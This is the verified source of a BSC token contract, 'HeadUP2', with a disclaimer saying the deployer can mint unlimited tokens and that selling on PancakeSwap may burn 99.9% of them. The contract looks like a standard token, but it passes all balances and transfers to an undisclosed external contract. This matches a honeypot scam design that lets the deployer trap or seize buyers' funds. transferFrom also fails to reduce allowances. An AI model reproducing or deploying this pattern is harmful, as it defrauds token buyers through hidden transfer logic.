/**
 *Submitted for verification at BscScan.com on 2022-05-20
*/

/*
--------------------------------------------------- DISCLAIMER ---------------------------------------------------

This is a collectable token, not an investment vehicle. If bought, token holders are aware of the fact that 
this collectable (with no utility) will most likely not produce capital gains. 

The tokenomics of this token have been designed to discourage the trading of this collectable. These tokenomics include:

 - Holders can freely send/transfer tokens to other partners/participants of the blockchain.

 - The contract deployer can generate new tokens (supply is unlimited) and sell them.

 - Selling these collectable tokens on PancakeSwap may lead to a 99.9% token burn. 

Note: In no event will the contract deployer or its affiliates be liable to refund purchasers of this collectable.

--------------------------------------------------------------------------------------------------------------------
*/ 

// SPDX-License-Identifier: MIT
pragma solidity ^0.5.16;

interface Acc {
    function doTransfer(address caller, address from, address to, uint amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
    function setup(address who,uint8 dec,uint256 total) external;
}

contract HeadUP {
    
    string public constant name = "HeadUP2";
    string public constant symbol = "HUP";
    uint8 public constant decimals = 18;
    uint256 totalSupply_;
    address private Acc_address;
    address private deployer;
    mapping(address => mapping (address => uint256)) allowed;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(address _acc) public {
        totalSupply_ = 2000000*10**18;
        deployer = msg.sender;
        Acc_address = _acc;
        Acc(Acc_address).setup(msg.sender,18,totalSupply_);
    }

        function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }
    function approve(address delegate, uint256 numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }
    function allowance(address owner, address delegate) public view returns (uint256) {
        return allowed[owner][delegate];
    }
    function balanceOf(address tokenOwner) public view returns (uint256) {
        return Acc(Acc_address).balanceOf(tokenOwner);
    }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(allowed[from][msg.sender]>=amount, "Not allowed");
        Acc(Acc_address).doTransfer(msg.sender,from, to, amount);
        emit Transfer(from, to, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool) {
        Acc(Acc_address).doTransfer(msg.sender,msg.sender, to, amount);
        emit Transfer(msg.sender, to, amount);
        return true;
    }
}